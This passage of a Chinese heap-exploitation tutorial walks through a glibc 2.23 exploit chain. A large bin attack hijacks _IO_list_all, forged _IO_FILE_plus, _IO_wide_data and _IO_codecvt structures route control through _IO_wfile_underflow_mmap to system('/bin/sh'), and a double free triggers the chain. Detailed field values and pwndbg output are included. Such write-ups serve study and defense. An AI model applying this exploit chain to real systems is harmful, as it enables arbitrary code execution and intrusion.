    *   **第二次写入（污染辅助目标）**：执行链表操作`victim->bk_nextsize->fd_nextsize = victim`。由于`victim->bk_nextsize`指向`target2`，此操作向 **`*(target2 + 0x20)`** 写入了`victim`的堆地址。

**利用达成的效果**：
至此，一次精心布局的Large Bin Attack成功实现了双重效果：
1.  **核心劫持**：全局IO链表头指针`_IO_list_all`被成功劫持，指向了可控的堆内存（`chunk[2]`）。这为后续在该地址伪造恶意的`_IO_FILE`结构并最终劫持控制流，创造了决定性的条件。
2.  **辅助破坏**：在第二个可控目标地址（`target2 + 0x20`）写入了一个堆地址。通过灵活选择`target2`（例如设为`global_max_fast`），可以进一步扰乱堆分配器的行为，为整个利用链提供额外的操作空间或破坏能力。

此步骤标志着从被动的信息收集阶段，正式进入了主动篡改关键全局数据结构、构建恶意执行环境的实质性利用阶段。

```bash
pwndbg> x/1gx &_IO_list_all
0x7ff16f58e540 <__GI__IO_list_all>:     0x00005dc295926940
pwndbg> x/10gx chunks
0x5dc28e86f060 <chunks>:        0x0000000000000020      0x00005dc295926010
0x5dc28e86f070 <chunks+16>:     0x0000000000000500      0x00005dc295926440
0x5dc28e86f080 <chunks+32>:     0x0000000000000400      0x00005dc295926950
0x5dc28e86f090 <chunks+48>:     0x0000000000000500      0x00005dc295926d60
0x5dc28e86f0a0 <chunks+64>:     0x0000000000000500      0x00005dc295927270
pwndbg> 
```

在成功将全局指针`_IO_list_all`劫持为指向可控堆块`chunk[2]`后，利用流程进入最关键的**数据构造阶段**。此时，需要在`chunk[2]`的内存中**完整伪造一个`_IO_FILE_plus`结构体**。此结构是将后续IO处理流程导向任意代码执行的“导航器”，其每一个字段都必须经过精心计算，以完美通过glibc内部的严格校验。

**伪造结构各核心字段的精确设置、目的与作用如下：**

1.  **`_flags`字段：绕过“不可读”检查**
    将此字段设置为`0xFFFFFFFFFFFFFFFB`。该值的比特模式经过特殊设计，**旨在确保`_IO_NO_READS`标志位被明确清除**。这使得伪造的文件流能够顺利通过`_IO_wfile_underflow_mmap`等函数中的 `if (__glibc_unlikely (fp->_flags & _IO_NO_READS))` 检查，避免执行流在初始阶段被提前终止。

2.  **虚表（`vtable`）指针：通过合法性验证并设定入口**
    将此指针设置为glibc内部合法的符号地址——**`_IO_wfile_jumps_mmap`**。**这是绕过glibc 2.24版本引入的vtable范围检查的核心**。由于该地址位于libc认可的合法vtable内存区域，因此能通过验证。此项设置使得对该伪造文件流`_IO_OVERFLOW`的调用，实际会跳转到`_IO_wfile_jumps_mmap`表中的**`_IO_wfile_underflow_mmap`**函数，从而将控制流导入预设的利用路径起点。

3.  **`_wide_data`指针：满足基本结构要求**
    将此指针指向一个可控的内存地址，例如`chunk0_addr + 0x30`。其目的是在该地址构造一个伪造的`_IO_wide_data`结构，以满足后续内部函数对`_wide_data`指针的基本非空检查，避免因空指针解引用导致进程意外崩溃。

4.  **`_codecvt`指针：指向最终的利用载荷**
    **这是整个利用链的最终枢纽**。将此指针设置为`chunk0_addr + 0x200`，并在此地址精心布置一个伪造的`_IO_codecvt`结构。在该结构中，通过将 **`__codecvt_do_in`**函数指针项设置为最终的目标函数地址（如`system`），为触发任意代码执行做好最终准备。

5.  **关键状态字段：精确操控执行路径**
    *   **触发`_IO_OVERFLOW`调用**：将`_mode`设为`0`，`_IO_write_ptr`设为`3`，`_IO_write_base`设为`2`。此组合旨在满足 **`_IO_flush_all_lockp`**函数内部的关键条件：`if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) ...)`。通过使`_mode <= 0` 且 `_IO_write_ptr > _IO_write_base` 同时成立，确保该伪造文件流被识别为“需要刷新”，从而触发对其`_IO_OVERFLOW`（即`_IO_wfile_underflow_mmap`）的调用。
    *   **引导至`__codecvt_do_in`调用**：将`_IO_read_end`字段设置为一个极大值（如`0xffffffffffffffff`）。**其核心目的**在于，与`_IO_read_ptr`配合，使得`_IO_wfile_underflow_mmap`函数中的条件判断 `if (fp->_IO_read_ptr >= fp->_IO_read_end && _IO_file_underflow_mmap (fp) == EOF)` **恒不成立**。这将迫使执行流进入另一条需要处理“缓冲区为空”的代码分支，该分支最终会调用`_codecvt`结构中的 **`__codecvt_do_in`**函数指针，从而跳转到预设的`system`等函数。

**总结**：此步骤的本质，是在被劫持的IO链表起点上，构建一个能通过glibc所有安全检查的“合法”文件流。通过精确设定状态标志绕过初步校验，指向合法虚表通过范围检查，并利用`_codecvt`指针链接至最终的利用载荷。同时，通过精心操控`_IO_write_ptr`、`_IO_write_base`和`_IO_read_end`等状态字段，精确地引导控制流依次通过`_IO_flush_all_lockp`的触发条件和`_IO_wfile_underflow_mmap`的内部路径选择，最终为触发`__codecvt_do_in`调用并执行任意代码，完成了全部必要的数据与指针准备。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)_IO_list_all
$1 = {
  file = {
    _flags = 0xfffffffb,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0xffffffffffffffff,
    _IO_read_base = 0x0,
    _IO_write_base = 0x2,
    _IO_write_ptr = 0x3,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x5dc295926200,
    _wide_data = 0x5dc295926030,
    _freeres_list = 0x2020202020202020,
    _freeres_buf = 0x2020202020202020,
    __pad5 = 0x2020202020202020,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7ff16f58c1a8
}
pwndbg> p/x *(struct _IO_jump_t*)0x7ff16f58c1a8
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x7ff16f26c263,
  __finish = 0x7ff16f267587,
  __overflow = 0x7ff16f2672bc,
  __underflow = 0x7ff16f2655fa,
  __uflow = 0x7ff16f265405,
  __pbackfail = 0x7ff16f267926,
  __xsputn = 0x7ff16f26bf4c,
  __xsgetn = 0x7ff16f266d64,
  __seekoff = 0x7ff16f26d997,
  __seekpos = 0x7ff16f26b30a,
  __setbuf = 0x7ff16f2677e1,
  __sync = 0x7ff16f261d6f,
  __doallocate = 0x7ff16f26bbf9,
  __read = 0x7ff16f26bc56,
  __write = 0x7ff16f26b9c0,
  __seek = 0x7ff16f26b758,
  __close = 0x7ff16f26bc3d,
  __stat = 0x7ff16f26e485,
  __showmanyc = 0x7ff16f26e48b,
  __imbue = 0x0
}
pwndbg> p/x &_IO_wfile_underflow_mmap
$3 = 0x7ff16f2672bc
pwndbg> 
```

在可控的堆内存区域（例如 `chunk0_addr + 0x30`）中，需要构造一个伪造的 **`_IO_wide_data`** 结构体。此结构体中的多个字段需经过精确设置，以通过 glibc IO 层的关键检查，确保控制流能按计划前进，最终抵达目标函数调用。

**各字段的伪造策略与利用目的如下：**

1.  **设置 `_IO_read_ptr` 与 `_IO_read_end` 以绕过缓冲区检查**：
    *   将 `_IO_read_ptr` 设为 `3`，`_IO_read_end` 设为 `2`。
    *   **利用目的**：在后续的 `_IO_wfile_underflow_mmap` 等函数执行路径中，存在对宽字符读缓冲区的检查：`if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)`。此条件旨在判断缓冲区中是否还有剩余数据可读。由于我们设置了 `3 < 2` 为**假**，该检查**无法通过**。这使得执行流**不会**进入“从现有缓冲区直接读取数据”的快速返回路径，从而避免了控制流在此处提前结束。这迫使 IO 逻辑必须继续向下执行，去处理“缓冲区耗尽”或“需要补充数据”的状况，这是我们引导控制流向更深层、更复杂的利用代码（最终调用 `__codecvt_do_in`）的关键一步。

2.  **设置 `_IO_buf_base` 以通过缓冲区基础指针检查**：
    *   将 `_IO_buf_base` 字段设为 `1`（或任何非零值）。
    *   **利用目的**：在 IO 层的某些处理函数中（例如与缓冲区分配相关的路径），会检查 `if (fp->_wide_data->_IO_buf_base == NULL)`，以判断宽字符缓冲区是否已初始化。通过将其设置为一个 **非 NULL** 值，我们成功地“欺骗”了检查，使代码逻辑认为缓冲区已经就绪，**绕过了可能触发缓冲区分配或错误处理的无关分支**。这确保了执行流能稳定地沿着我们预设的、不涉及真实缓冲区分配的路经前进，最终汇聚到调用 `_codecvt` 结构中的转换函数（`__codecvt_do_in`）的路径上。

**总结**：通过对 `_IO_wide_data` 结构中 `_IO_read_ptr`、`_IO_read_end` 和 `_IO_buf_base` 字段的精确伪造，巧妙地操控了 glibc IO 内部的状态判断逻辑。这些设置共同作用，**一是**避免了因“缓冲区仍有数据”的误判而提前返回；**二是**绕过了因“缓冲区未分配”而触发的复杂分配或错误处理。其最终目的是清除所有可能导致执行流偏离的“岔路”，确保控制流能够坚定不移地沿着精心铺设的轨道，最终抵达并执行 `_IO_codecvt` 结构中预设的 **`__codecvt_do_in`** 函数指针，从而完成任意代码执行。

```bash
pwndbg> p/x *(struct _IO_wide_data*)0x5dc295926030
$4 = {
  _IO_read_ptr = 0x3,
  _IO_read_end = 0x2,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x1,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _IO_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x5dc2959260e8
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x5dc2959260e8
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x5dc295926128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x5dc295926128
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x0
}
pwndbg> 
```

在可控的堆内存地址（`chunk0_addr + 0x200`）处，需要精心构造一个伪造的 **`_IO_codecvt`** 结构体。这是整个利用链的**最终执行枢纽与终点**，其内部的两个关键指针将直接决定控制流的最终去向与执行内容。

**该伪造结构的具体布局与其在利用中的决定性作用如下：**

1.  **设置`__codecvt_do_in`函数指针（装载最终利用代码）**：
    将此指针项设置为目标函数的地址。通常是二者择一：
    *   **`system`函数的地址**：用于执行任意系统命令，是获取shell的通用方法。
    *   一个合适的 **`one_gadget`** 地址：用于直接跳转到libc中一段能够启动shell的现有代码片段，条件满足时更为简洁。
    *   **核心利用作用**：在`_IO_wfile_underflow_mmap`函数的执行路径中，当代码判定需要执行字符集转换时，会调用 **`(*cd->__codecvt_do_in) (cd, ...)`**。由于此前完全控制了`cd`（即指向此伪造结构的指针），此调用将**毫无保留地跳转**到我们预设的`system`或`one_gadget`地址，从而完全获取程序控制权。

2.  **设置`__codecvt_destr`指针（提供利用参数）**：
    将此指针项设置为字符串 **`“/bin/sh”`**。
    *   **核心利用作用**：当上述`__codecvt_do_in`被调用时，其第一个参数`cd`正是这个伪造的`_IO_codecvt`结构体的地址。在`system`函数的调用约定中，`cd`被作为第一个参数（即命令字符串指针）传递。由于此前将`__codecvt_destr`布置在结构体起始附近并设置为`“/bin/sh”`，因此对`system(cd)`的调用，在内存解析上等同于`system(“/bin/sh”)`，从而成功执行命令，获取shell。

**总结**：此步骤是整个复杂利用链的“终极装弹”与“瞄准”阶段。通过在可控内存中原子级精确地伪造`_IO_codecvt`结构，并将其关键的函数指针和字符串指针指向利用载荷，成功地将glibc IO内部一个合法的、用于字符转换的内部调用，劫持并转化为一次可靠、稳定且完全可控的任意命令执行。

```bash
pwndbg> p/x *(struct _IO_codecvt*)0x5dc295926200
$5 = {
  __codecvt_destr = 0x68732f6e69622f,
  __codecvt_do_out = 0x0,
  __codecvt_do_unshift = 0x0,
  __codecvt_do_in = 0x7ff16f23c3eb,
  __codecvt_do_encoding = 0x0,
  __codecvt_do_always_noconv = 0x0,
  __codecvt_do_length = 0x0,
  __codecvt_do_max_length = 0x0,
  __cd_in = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  },
  __cd_out = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x5dc295926290
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x5dc295926290
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  }
}
pwndbg>
```

整个利用链的最终引爆，始于一次主动触发的堆管理器错误。**再次释放**已位于large bin中的`chunk[0]`，会立即被glibc识别为**双重释放**。分配器在`_int_free`函数中检测到此异常，随即调用 **`malloc_printerr`** 进入错误处理流程。

`malloc_printerr`在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 函数，以强制刷新所有已打开的文件流。此函数会遍历由全局指针`_IO_list_all`管理的IO链表。由于此前通过Large Bin Attack已成功将该指针劫持为指向`chunk[2]`，因此遍历从我们精心伪造的`_IO_FILE_plus`结构开始。

当执行流抵达`chunk[2]`处的伪造结构时，IO层会校验其状态。得益于对`_mode`、`_IO_write_ptr`及`_IO_write_base`等字段的精确预设，该结构被成功识别为一个需要刷新缓冲区的有效、活跃的文件流。此判定导致通过其虚表（vtable）调用 **`_IO_OVERFLOW`** 函数。

由于我们已将伪造结构的虚表指针设置为 **`_IO_wfile_jumps_mmap`**，其`_IO_OVERFLOW`条目实际指向该表中的 **`_IO_wfile_underflow_mmap`** 函数。至此，控制流被成功地从通用的堆错误处理路径，无缝导入我们预先铺设的、针对宽字符文件流的特定利用链入口，为后续执行任意代码打开了大门。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7ff16f26de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wfile_underflow_mmap>
        rdi: 0x5dc295926940 ◂— 0xfffffffffffffffb
```

当执行流进入 **`_IO_wfile_underflow_mmap`** 函数后，其内部存在一系列严格的状态校验。由于前期对所有相关数据结构进行了**精密到字节的构造**，这些校验被一一绕过，引导控制流不可阻挡地走向预设的恶意代码执行点。

1.  **绕过“不可读”标志检查**：函数首先检查 `if (__glibc_unlikely (fp->_flags & _IO_NO_READS))`。我们在伪造`_IO_FILE_plus`结构时，已将`_flags`字段明确设置为`0xFFFFFFFFFFFFFFFB`，**此值确保了`_IO_NO_READS`标志位被清除**。因此，此项检查顺利通过，确认了该伪造流为可读状态。

2.  **绕过宽字符缓冲区数据检查**：接着，函数检查宽字符读缓冲区是否还有数据，即 `if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)`。在伪造的`_IO_wide_data`结构中，我们已将`_IO_read_ptr`设为`3`，`_IO_read_end`设为`2`，使得条件 `3 < 2` **不成立**。这 **阻止了**执行流进入直接从现有宽字符缓冲区返回数据的快速路径，迫使其继续深入。

3.  **绕过窄字符流下溢处理检查**：随后，函数尝试处理窄字符（`char`）流，检查 `if (fp->_IO_read_ptr >= fp->_IO_read_end && _IO_file_underflow_mmap (fp) == EOF)`。由于我们已将`_IO_read_end`设为极大值（`0xffffffffffffffff`），`fp->_IO_read_ptr >= fp->_IO_read_end`的条件不成立。同时，通过整个链的构造，确保`_IO_file_underflow_mmap`的调用不会简单地返回`EOF`。这使得此复合条件判断的整个结果为假，执行流再次绕过无关分支。

4.  **绕过宽字符缓冲区基址检查**：在后续路径中，函数可能检查宽字符缓冲区是否已初始化，即 `if (fp->_wide_data->_IO_buf_base == NULL)`。我们在伪造`_IO_wide_data`时已将`_IO_buf_base`设为非零值（如`1`），**“欺骗”** 了此项检查，使代码逻辑认为缓冲区已准备就绪，从而避免了触发无关的缓冲区分配或错误处理。

在成功突破上述所有“关卡”后，执行流抵达其最终目的地：调用与文件流关联的`_codecvt`结构中的转换函数，即 **`(*cd->__codecvt_do_in) (cd, ...)`**。

由于此前已完全控制`cd`所指向的伪造`_IO_codecvt`结构，并将`__codecvt_do_in`设置为`system`地址，同时将`__codecvt_destr`设置为字符串`“/bin/sh”`，此调用即等价于执行 **`system(“/bin/sh”)`**。至此，整个从堆布局、信息泄露、全局指针劫持到复杂IO结构伪造的精密利用链宣告完成，成功**获取了目标系统的shell控制权**。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:394
   388       _IO_wdoallocbuf (fp);
   389     }
   390 
   391   fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
   392   fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
   393     fp->_wide_data->_IO_buf_base;
 ► 394   (*cd->__codecvt_do_in) (cd, &fp->_wide_data->_IO_state,
   395                           fp->_IO_read_ptr, fp->_IO_read_end,
   396                           &read_stop,
   397                           fp->_wide_data->_IO_read_ptr,
   398                           fp->_wide_data->_IO_buf_end,
   399                           &fp->_wide_data->_IO_read_end);
 
 ► 0x7ff16f267390 <_IO_wfile_underflow_mmap+212>    call   qword ptr [rbp + 0x18]      <system>
        command: 0x5dc295926200 ◂— 0x68732f6e69622f /* '/bin/sh' */
```


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
